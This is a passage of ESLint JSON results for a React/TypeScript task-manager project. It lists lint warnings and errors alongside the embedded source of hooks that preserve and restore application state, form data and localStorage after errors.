console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":389,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":389,"endColumn":22,"suggestions":[{"fix":{"range":[11427,11498],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":404,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":404,"endColumn":20,"suggestions":[{"fix":{"range":[11869,11929],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":417,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":417,"endColumn":20,"suggestions":[{"fix":{"range":[12231,12293],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":432,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":432,"endColumn":24,"suggestions":[{"fix":{"range":[12715,12763],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":456,"column":17,"nodeType":"MemberExpression","messageId":"unexpected","endLine":456,"endColumn":29,"suggestions":[{"fix":{"range":[13907,13955],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":473,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":473,"endColumn":24,"suggestions":[{"fix":{"range":[14348,14413],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":519,"column":44,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":519,"endColumn":47,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[15471,15474],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[15471,15474],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":520,"column":34,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":520,"endColumn":37,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[15511,15514],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[15511,15514],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":526,"column":40,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":526,"endColumn":43,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[15711,15714],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[15711,15714],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":529,"column":30,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":529,"endColumn":33,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[15829,15832],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[15829,15832],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":540,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":540,"endColumn":17,"suggestions":[{"fix":{"range":[16096,16148],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":549,"column":51,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":549,"endColumn":54,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[16273,16276],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[16273,16276],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":565,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":565,"endColumn":17,"suggestions":[{"fix":{"range":[16842,16894],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":30,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Application State Hook (2025)\n * \n * Custom React hook for managing application state during error scenarios.\n * Provides seamless state preservation, restoration, and recovery mechanisms\n * with integration to Zustand stores and session management.\n * \n * Features:\n * - Automatic state preservation on errors\n * - Intelligent state restoration\n * - Integration with error boundaries\n * - Cross-component state synchronization\n * - Performance-optimized state handling\n */\n\nimport { useCallback, useEffect, useState, useRef } from 'react';\nimport { useTaskStore } from '../store/useTaskStore';\nimport { sessionPreservationManager, SessionData, preserveCurrentSession } from '../utils/sessionPreservation';\nimport { errorReportingService } from '../services/ErrorReportingService';\nimport { errorHandlingConfig } from '../config/errorHandling';\n\n// App state interface\nexport interface AppState {\n  tasks: any;\n  ui: {\n    currentView: string;\n    sidebarOpen: boolean;\n    theme: string;\n    filters: any;\n    search: string;\n    selectedTasks: string[];\n  };\n  user: {\n    preferences: any;\n    settings: any;\n    profile?: any;\n  };\n  navigation: {\n    history: string[];\n    currentPath: string;\n    previousPath?: string;\n  };\n  forms: Record<string, any>;\n  errors: {\n    count: number;\n    lastError?: Error;\n    recoveryAttempts: number;\n  };\n}\n\n// State preservation result\nexport interface StatePreservationResult {\n  sessionId: string;\n  success: boolean;\n  dataSize: number;\n  timestamp: number;\n}\n\n// State restoration result\nexport interface StateRestorationResult {\n  success: boolean;\n  sessionId: string;\n  restoredData: any;\n  partialRestore: boolean;\n  errors: string[];\n}\n\n// Hook options\nexport interface UseAppStateOptions {\n  enableAutoPreservation?: boolean;\n  enablePeriodicBackup?: boolean;\n  backupInterval?: number;\n  enableErrorReporting?: boolean;\n  preserveOnUnload?: boolean;\n  restoreOnMount?: boolean;\n  enableCrossTabSync?: boolean;\n}\n\n// Default options\nconst _defaultOptions: Required<UseAppStateOptions> = {\n  enableAutoPreservation: true,\n  enablePeriodicBackup: false,\n  backupInterval: 30000, // 30 seconds\n  enableErrorReporting: true,\n  preserveOnUnload: true,\n  restoreOnMount: true,\n  enableCrossTabSync: false,\n};\n\n/**\n * Application State Management Hook\n */\nexport const useAppState = (options: UseAppStateOptions = {}) => {\n  const config = { ..._defaultOptions, ...options };\n  \n  // Store references\n  // Get the actual store instance for getState/setState access\n  const taskStore = useTaskStore;\n  \n  // State\n  const [isPreserving, setIsPreserving] = useState(false);\n  const [isRestoring, setIsRestoring] = useState(false);\n  const [lastPreservation, setLastPreservation] = useState<StatePreservationResult | null>(null);\n  const [availableSessions, setAvailableSessions] = useState<SessionData[]>([]);\n  const [autoBackupEnabled, setAutoBackupEnabled] = useState(config.enablePeriodicBackup);\n  \n  // Refs for stable references\n  const preservationIntervalRef = useRef<NodeJS.Timeout | null>(null);\n  const errorCountRef = useRef(0);\n  const lastErrorRef = useRef<Error | null>(null);\n\n  /**\n   * Get current application state\n   */\n  const getCurrentAppState = useCallback((): AppState => {\n    const taskState = taskStore.getState();\n    \n    return {\n      tasks: {\n        tasks: taskState.tasks,\n        filters: taskState.filters,\n        viewMode: taskState.viewMode,\n        analytics: taskState.analytics,\n      },\n      ui: {\n        currentView: window.location.pathname,\n        sidebarOpen: taskState.sidebarOpen || false,\n        theme: taskState.theme || 'system',\n        filters: taskState.filters,\n        search: taskState.searchQuery || '',\n        selectedTasks: taskState.selectedTaskIds || [],\n      },\n      user: {\n        preferences: taskState.userPreferences || {},\n        settings: taskState.settings || {},\n      },\n      navigation: {\n        history: [window.location.pathname],\n        currentPath: window.location.pathname,\n        previousPath: document.referrer ? new URL(document.referrer).pathname : undefined,\n      },\n      forms: extractFormData(),\n      errors: {\n        count: errorCountRef.current,\n        lastError: lastErrorRef.current,\n        recoveryAttempts: 0,\n      },\n    };\n  }, [taskStore]);\n\n  /**\n   * Preserve current application state\n   */\n  const preserveState = useCallback(async (\n    reason: string = 'manual',\n    errorId?: string\n  ): Promise<StatePreservationResult> => {\n    if (isPreserving) {\n      throw new Error('State preservation already in progress');\n    }\n\n    setIsPreserving(true);\n\n    try {\n      const appState = getCurrentAppState();\n      const sessionId = await sessionPreservationManager.preserveSession(\n        reason,\n        errorId,\n        { appState }\n      );\n\n      const result: StatePreservationResult = {\n        sessionId,\n        success: true,\n        dataSize: JSON.stringify(appState).length,\n        timestamp: Date.now(),\n      };\n\n      setLastPreservation(result);\n      \n      // Report preservation if enabled\n      if (config.enableErrorReporting && reason.includes('error')) {\n        errorReportingService.reportError(\n          new Error(`State preserved due to: ${reason}`),\n          undefined,\n          {\n            component: 'useAppState',\n            action: 'state_preservation',\n            severity: 'medium',\n            metadata: { sessionId, dataSize: result.dataSize }\n          }\n        );\n      }\n\n      console.debug('State preserved successfully:', result);\n      return result;\n\n    } catch (error) {\n      console.error('Failed to preserve state:', error);\n      \n      const result: StatePreservationResult = {\n        sessionId: '',\n        success: false,\n        dataSize: 0,\n        timestamp: Date.now(),\n      };\n\n      if (config.enableErrorReporting) {\n        errorReportingService.reportError(\n          error as Error,\n          undefined,\n          {\n            component: 'useAppState',\n            action: 'state_preservation_failed',\n            severity: 'high'\n          }\n        );\n      }\n\n      return result;\n    } finally {\n      setIsPreserving(false);\n    }\n  }, [isPreserving, getCurrentAppState, config.enableErrorReporting]);\n\n  /**\n   * Restore application state from session\n   */\n  const restoreState = useCallback(async (\n    sessionId?: string\n  ): Promise<StateRestorationResult> => {\n    if (isRestoring) {\n      throw new Error('State restoration already in progress');\n    }\n\n    setIsRestoring(true);\n\n    try {\n      let targetSessionId = sessionId;\n      \n      // If no session ID provided, get the most recent one\n      if (!targetSessionId) {\n        const sessions = await sessionPreservationManager.getSessions();\n        if (sessions.length === 0) {\n          throw new Error('No preserved sessions available');\n        }\n        targetSessionId = sessions[0].id;\n      }\n\n      const restoredData = await sessionPreservationManager.restoreSession(targetSessionId);\n      const appState = restoredData.custom?.appState;\n\n      if (!appState) {\n        throw new Error('No application state found in session');\n      }\n\n      const errors: string[] = [];\n      let partialRestore = false;\n\n      // Restore task store state\n      try {\n        if (appState.tasks) {\n          // Use batch update for better performance\n          taskStore.setState({\n            tasks: appState.tasks.tasks || taskStore.getState().tasks,\n            filters: appState.tasks.filters || taskStore.getState().filters,\n            viewMode: appState.tasks.viewMode || taskStore.getState().viewMode,\n            searchQuery: appState.ui?.search || taskStore.getState().searchQuery,\n            sidebarCollapsed: appState.ui?.sidebarOpen === false,\n            userSettings: appState.user?.preferences || taskStore.getState().userSettings,\n          });\n        }\n      } catch (error) {\n        console.warn('Failed to restore task store state:', error);\n        errors.push('Task store restoration failed');\n        partialRestore = true;\n      }\n\n      // Restore navigation state\n      try {\n        if (appState.navigation?.currentPath && \n            appState.navigation.currentPath !== window.location.pathname) {\n          // Only navigate if it's different from current path\n          window.history.pushState(null, '', appState.navigation.currentPath);\n        }\n      } catch (error) {\n        console.warn('Failed to restore navigation state:', error);\n        errors.push('Navigation restoration failed');\n        partialRestore = true;\n      }\n\n      // Restore form data\n      try {\n        if (appState.forms) {\n          restoreFormData(appState.forms);\n        }\n      } catch (error) {\n        console.warn('Failed to restore form data:', error);\n        errors.push('Form data restoration failed');\n        partialRestore = true;\n      }\n\n      // Restore localStorage data if available\n      try {\n        if (restoredData.localStorage) {\n          Object.entries(restoredData.localStorage).forEach(([key, value]) => {\n            try {\n              localStorage.setItem(key, typeof value === 'string' ? value : JSON.stringify(value));\n            } catch (error) {\n              console.warn(`Failed to restore localStorage key \"${key}\":`, error);\n            }\n          });\n        }\n      } catch (error) {\n        console.warn('Failed to restore localStorage data:', error);\n        errors.push('Local storage restoration failed');\n        partialRestore = true;\n      }\n\n      const result: StateRestorationResult = {\n        success: true,\n        sessionId: targetSessionId,\n        restoredData: appState,\n        partialRestore,\n        errors,\n      };\n\n      if (config.enableErrorReporting) {\n        errorReportingService.reportError(\n          new Error('State restored from session'),\n          undefined,\n          {\n            component: 'useAppState',\n            action: 'state_restoration',\n            severity: 'low',\n            metadata: { \n              sessionId: targetSessionId, \n              partialRestore,\n              errorCount: errors.length \n            }\n          }\n        );\n      }\n\n      console.debug('State restored successfully:', result);\n      return result;\n\n    } catch (error) {\n      console.error('Failed to restore state:', error);\n      \n      const result: StateRestorationResult = {\n        success: false,\n        sessionId: sessionId || '',\n        restoredData: null,\n        partialRestore: false,\n        errors: [error.message],\n      };\n\n      if (config.enableErrorReporting) {\n        errorReportingService.reportError(\n          error as Error,\n          undefined,\n          {\n            component: 'useAppState',\n            action: 'state_restoration_failed',\n            severity: 'high',\n            metadata: { sessionId }\n          }\n        );\n      }\n\n      return result;\n    } finally {\n      setIsRestoring(false);\n    }\n  }, [isRestoring, taskStore, config.enableErrorReporting]);\n\n  /**\n   * Auto-preserve state on error\n   */\n  const preserveOnError = useCallback(async (error: Error, errorId?: string) => {\n    errorCountRef.current += 1;\n    lastErrorRef.current = error;\n\n    if (config.enableAutoPreservation && errorHandlingConfig.errorBoundary.enableStatePreservation) {\n      try {\n        await preserveState(`error_${error.name}`, errorId);\n      } catch (preservationError) {\n        console.error('Failed to preserve state on error:', preservationError);\n      }\n    }\n  }, [config.enableAutoPreservation, preserveState]);\n\n  /**\n   * Clear all preserved sessions\n   */\n  const clearPreservedSessions = useCallback(async (): Promise<boolean> => {\n    try {\n      await sessionPreservationManager.clearSessions();\n      setAvailableSessions([]);\n      setLastPreservation(null);\n      return true;\n    } catch (error) {\n      console.error('Failed to clear preserved sessions:', error);\n      return false;\n    }\n  }, []);\n\n  /**\n   * Get available sessions for restoration\n   */\n  const refreshAvailableSessions = useCallback(async () => {\n    try {\n      const sessions = await sessionPreservationManager.getSessions();\n      setAvailableSessions(sessions);\n    } catch (error) {\n      console.error('Failed to refresh available sessions:', error);\n    }\n  }, []);\n\n  /**\n   * Toggle automatic backup\n   */\n  const toggleAutoBackup = useCallback((enabled?: boolean) => {\n    const newState = enabled ?? !autoBackupEnabled;\n    setAutoBackupEnabled(newState);\n\n    if (newState && config.enablePeriodicBackup) {\n      // Start periodic backup\n      preservationIntervalRef.current = setInterval(() => {\n        preserveState('periodic_backup').catch(error => {\n          console.error('Periodic backup failed:', error);\n        });\n      }, config.backupInterval);\n    } else if (preservationIntervalRef.current) {\n      // Stop periodic backup\n      clearInterval(preservationIntervalRef.current);\n      preservationIntervalRef.current = null;\n    }\n  }, [autoBackupEnabled, config.enablePeriodicBackup, config.backupInterval, preserveState]);\n\n  // Setup automatic state preservation on mount\n  useEffect(() => {\n    // Restore state on mount if enabled and sessions are available\n    if (config.restoreOnMount) {\n      refreshAvailableSessions().then(() => {\n        sessionPreservationManager.getSessions().then(sessions => {\n          if (sessions.length > 0) {\n            // Check if we should automatically restore the most recent session\n            const mostRecent = sessions[0];\n            const timeSincePreservation = Date.now() - mostRecent.timestamp;\n            \n            // Auto-restore if session is less than 5 minutes old and was preserved due to error\n            if (timeSincePreservation < 300000 && mostRecent.metadata.preservationReason.includes('error')) {\n              restoreState(mostRecent.id).catch(error => {\n                console.warn('Auto-restoration failed:', error);\n              });\n            }\n          }\n        });\n      });\n    }\n\n    // Setup periodic backup if enabled\n    if (config.enablePeriodicBackup && autoBackupEnabled) {\n      toggleAutoBackup(true);\n    }\n\n    // Setup unload preservation\n    if (config.preserveOnUnload) {\n      const handleBeforeUnload = () => {\n        preserveCurrentSession('page_unload').catch(error => {\n          console.error('Failed to preserve state on page unload:', error);\n        });\n      };\n\n      window.addEventListener('beforeunload', handleBeforeUnload);\n      return () => {\n        window.removeEventListener('beforeunload', handleBeforeUnload);\n        if (preservationIntervalRef.current) {\n          clearInterval(preservationIntervalRef.current);\n        }\n      };\n    }\n\n    return () => {\n      if (preservationIntervalRef.current) {\n        clearInterval(preservationIntervalRef.current);\n      }\n    };\n  }, [config, autoBackupEnabled, toggleAutoBackup, restoreState, refreshAvailableSessions]);\n\n  // Return hook interface\n  return {\n    // State\n    currentState: getCurrentAppState(),\n    isPreserving,\n    isRestoring,\n    lastPreservation,\n    availableSessions,\n    autoBackupEnabled,\n\n    // Actions\n    preserveState,\n    restoreState,\n    preserveOnError,\n    clearPreservedSessions,\n    refreshAvailableSessions,\n    toggleAutoBackup,\n\n    // Utilities\n    stats: sessionPreservationManager.getStats(),\n  };\n};\n\n/**\n * Extract form data from current page\n */\nfunction extractFormData(): Record<string, any> {\n  const formData: Record<string, any> = {};\n  \n  try {\n    const forms = document.querySelectorAll('form');\n    forms.forEach((form, index) => {\n      const formId = form.id || `form_${index}`;\n      const formValues: Record<string, any> = {};\n      \n      const inputs = form.querySelectorAll('input, textarea, select');\n      inputs.forEach((input: any) => {\n        if (input.name && input.type !== 'password') {\n          formValues[input.name] = input.value;\n        }\n      });\n      \n      if (Object.keys(formValues).length > 0) {\n        formData[formId] = formValues;\n      }\n    });\n  } catch (error) {\n    console.warn('Failed to extract form data:', error);\n  }\n  \n  return formData;\n}\n\n/**\n * Restore form data to current page\n */\nfunction restoreFormData(formData: Record<string, any>): void {\n  try {\n    Object.entries(formData).forEach(([formId, values]) => {\n      const form = document.getElementById(formId) || \n                   document.querySelectorAll('form')[parseInt(formId.replace('form_', ''))];\n      \n      if (form && values) {\n        Object.entries(values).forEach(([name, value]) => {\n          const input = form.querySelector(`[name=\"${name}\"]`) as HTMLInputElement;\n          if (input && input.type !== 'password') {\n            input.value = value as string;\n          }\n        });\n      }\n    });\n  } catch (error) {\n    console.warn('Failed to restore form data:', error);\n  }\n}\n\n// Export hook as default\nexport default useAppState;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/hooks/useClaudeConfig.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/hooks/useErrorBoundary.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":57,"column":39,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":57,"endColumn":42,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1929,1932],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1929,1932],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"The 'config' object makes the dependencies of useCallback Hook (at line 265) change on every render. To fix this, wrap the initialization of 'config' in its own useMemo() Hook.","line":82,"column":9,"nodeType":"VariableDeclarator","endLine":82,"endColumn":52},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useErrorHandler\" is called in function \"_useErrorBoundary\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":85,"column":29,"nodeType":"Identifier","endLine":85,"endColumn":44},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useAppState\" is called in function \"_useErrorBoundary\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":86,"column":64,"nodeType":"Identifier","endLine":86,"endColumn":75},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_useErrorBoundary\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":91,"column":39,"nodeType":"Identifier","endLine":91,"endColumn":47},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_useErrorBoundary\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":103,"column":32,"nodeType":"Identifier","endLine":103,"endColumn":40},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useRef\" is called in function \"_useErrorBoundary\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":109,"column":34,"nodeType":"Identifier","endLine":109,"endColumn":40},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useRef\" is called in function \"_useErrorBoundary\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":110,"column":27,"nodeType":"Identifier","endLine":110,"endColumn":33},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_useErrorBoundary\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":115,"column":23,"nodeType":"Identifier","endLine":115,"endColumn":34},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":145,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":145,"endColumn":22,"suggestions":[{"fix":{"range":[4720,4791],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":165,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":165,"endColumn":22,"suggestions":[{"fix":{"range":[5332,5389],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useCallback has a missing dependency: 'attemptAutoRecovery'. Either include it or remove the dependency array.","line":179,"column":6,"nodeType":"ArrayExpression","endLine":185,"endColumn":4,"suggestions":[{"desc":"Update the dependencies array to be: [config, errorState.canRetry, errorState.retryCount, reactErrorHandler, preserveOnError, attemptAutoRecovery]","fix":{"range":[5715,5827],"text":"[config, errorState.canRetry, errorState.retryCount, reactErrorHandler, preserveOnError, attemptAutoRecovery]"}}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_useErrorBoundary\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":190,"column":31,"nodeType":"Identifier","endLine":190,"endColumn":42},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":206,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":206,"endColumn":24,"suggestions":[{"fix":{"range":[6463,6527],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":210,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":210,"endColumn":26,"suggestions":[{"fix":{"range":[6628,6697],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":215,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":215,"endColumn":23,"suggestions":[{"fix":{"range":[6821,6895],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useCallback has missing dependencies: 'handleRecovery' and 'handleRetry'. Either include them or remove the dependency array.","line":228,"column":6,"nodeType":"ArrayExpression","endLine":228,"endColumn":57,"suggestions":[{"desc":"Update the dependencies array to be: [errorState, recoveryStrategies, config.retryDelay, handleRecovery, handleRetry]","fix":{"range":[7257,7308],"text":"[errorState, recoveryStrategies, config.retryDelay, handleRecovery, handleRetry]"}}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_useErrorBoundary\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":233,"column":26,"nodeType":"Identifier","endLine":233,"endColumn":37},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":260,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":260,"endColumn":22,"suggestions":[{"fix":{"range":[8147,8198],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_useErrorBoundary\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":270,"column":23,"nodeType":"Identifier","endLine":270,"endColumn":34},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":293,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":293,"endColumn":22,"suggestions":[{"fix":{"range":[9023,9073],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useCallback has a missing dependency: 'config'. Either include it or remove the dependency array.","line":296,"column":6,"nodeType":"ArrayExpression","endLine":304,"endColumn":4,"suggestions":[{"desc":"Update the dependencies array to be: [errorState.canRetry, errorState.retryCount, config, availableSessions.length, restoreState, handleRecovery]","fix":{"range":[9093,9259],"text":"[errorState.canRetry, errorState.retryCount, config, availableSessions.length, restoreState, handleRecovery]"}}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_useErrorBoundary\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":309,"column":30,"nodeType":"Identifier","endLine":309,"endColumn":41},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":330,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":330,"endColumn":20,"suggestions":[{"fix":{"range":[9935,9991],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_useErrorBoundary\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":338,"column":30,"nodeType":"Identifier","endLine":338,"endColumn":41},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_useErrorBoundary\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":360,"column":25,"nodeType":"Identifier","endLine":360,"endColumn":36},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useCallback\" is called in function \"_useErrorBoundary\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":376,"column":34,"nodeType":"Identifier","endLine":376,"endColumn":45},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useEffect\" is called in function \"_useErrorBoundary\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":382,"column":3,"nodeType":"Identifier","endLine":382,"endColumn":12},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'error' is defined but never used.","line":448,"column":20,"nodeType":null,"messageId":"unusedVar","endLine":448,"endColumn":25},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'state' is defined but never used.","line":448,"column":27,"nodeType":null,"messageId":"unusedVar","endLine":448,"endColumn":32},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'state' is defined but never used.","line":460,"column":27,"nodeType":null,"messageId":"unusedVar","endLine":460,"endColumn":32}],"suppressedMessages":[],"errorCount":15,"fatalErrorCount":0,"warningCount":16,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Error Boundary Hook (2025)\n * \n * Custom React hook that provides comprehensive error boundary functionality\n * with MUI integration, user feedback mechanisms, and state preservation.\n * Combines error handling patterns for seamless error recovery experience.\n * \n * Features:\n * - Integration with MUI error boundary components\n * - Automatic error reporting and user feedback collection\n * - State preservation and restoration during errors\n * - Error categorization and smart recovery strategies\n * - Performance monitoring and error analytics\n */\n\nimport { useCallback, useEffect, useState, useRef } from 'react';\nimport { useErrorHandler } from 'react-error-boundary';\nimport { errorReportingService, ErrorContext, UserFeedback } from '../services/ErrorReportingService';\nimport { useAppState } from './useAppState';\nimport { errorHandlingConfig, classifyError, getErrorMessage } from '../config/errorHandling';\n\n// Error boundary state\nexport interface ErrorBoundaryState {\n  hasError: boolean;\n  error: Error | null;\n  errorId: string | null;\n  errorType: string;\n  retryCount: number;\n  lastRetryTime: number | null;\n  canRetry: boolean;\n  autoRecoveryInProgress: boolean;\n  userFeedbackSubmitted: boolean;\n}\n\n// Error recovery strategy\nexport interface ErrorRecoveryStrategy {\n  id: string;\n  name: string;\n  description: string;\n  automatic: boolean;\n  priority: number;\n  canExecute: (error: Error, state: ErrorBoundaryState) => boolean;\n  execute: () => Promise<boolean>;\n}\n\n// Error handling options\nexport interface UseErrorBoundaryOptions {\n  enableAutoRecovery?: boolean;\n  enableUserFeedback?: boolean;\n  enableStatePreservation?: boolean;\n  maxRetryAttempts?: number;\n  retryDelay?: 